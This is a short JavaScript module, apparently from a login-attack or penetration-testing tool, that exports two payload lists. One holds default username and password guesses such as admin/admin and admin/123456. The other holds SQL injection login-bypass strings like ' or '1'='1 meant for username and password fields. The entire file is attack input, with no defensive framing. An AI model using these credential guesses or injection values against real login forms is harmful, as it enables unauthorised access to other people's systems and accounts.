const listUserPassDefault = [
    {
        username: 'admin',
        password: 'admin'
    },
    {
        username: 'user',
        password: 'user'
    },
    {
        username: 'test',
        password: 'test'
    },
    {
        username: 'admin',
        password: '123'
    },
    {
        username: 'admin',
        password: '12345'
    },
    {
        username: 'admin',
        password: '123456'
    },
    {
        username: 'admin1',
        password: '123'
    },
    {
        username: 'admin1',
        password: '123456'
    },
    {
        username: 'admin',
        password: '111111'
    },
    {
        username: 'admin',
        password: '222222'
    },
    {
        username: 'admin',
        password: '333333'
    },
    {
        username: 'admin',
        password: '444444'
    },
    {
        username: 'admin',
        password: '555555'
    },
    {
        username: 'admin',
        password: '666666'
    },
    {
        username: 'admin',
        password: '777777'
    },
    {
        username: 'admin',
        password: '888888'
    },
    {
        username: 'admin',
        password: '999999'
    },
]
const listUserPassInjection = [
    {
        username: 'admin',
        password: `' or '1'='1`
    },
    {
        username: 'admin',
        password: `' or 1='1`
    },
    {
        username: `' or '1'='1`,
        password: `' or '1'='1`
    },
    {
        username: `' or ' 1=1`,
        password: `' or ' 1=1`
    },
]

module.exports = { listUserPassDefault, listUserPassInjection }